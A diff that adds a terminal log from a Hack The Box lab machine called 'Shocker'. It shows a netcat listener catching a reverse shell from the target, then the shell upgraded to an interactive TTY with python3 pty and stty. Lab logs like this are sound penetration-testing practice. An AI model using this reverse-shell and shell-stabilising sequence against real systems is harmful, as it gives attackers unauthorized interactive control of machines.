@@ -1,0 +1,23 @@
+jonathan@kali:~/htb/boxes$ nc -lvnp 1984
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::1984
+Ncat: Listening on 0.0.0.0:1984
+Ncat: Connection from 10.10.10.56.
+Ncat: Connection from 10.10.10.56:57588.
+bash: no job control in this shell
+shelly@Shocker:/usr/lib/cgi-bin$ which python
+which python
+shelly@Shocker:/usr/lib/cgi-bin$ which python3
+which python3
+/usr/bin/python3
+shelly@Shocker:/usr/lib/cgi-bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+<-bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'                        
+shelly@Shocker:/usr/lib/cgi-bin$ ^Z
+[1]+  Stopped                 nc -lvnp 1984
+jonathan@kali:~/htb/boxes$ stty raw -echo
+jonathan@kali:~/htb/boxes$ nc -lvnp 1984
+
+shelly@Shocker:/usr/lib/cgi-bin$ stty rows 40 columns 170
+shelly@Shocker:/usr/lib/cgi-bin$ 
+
+
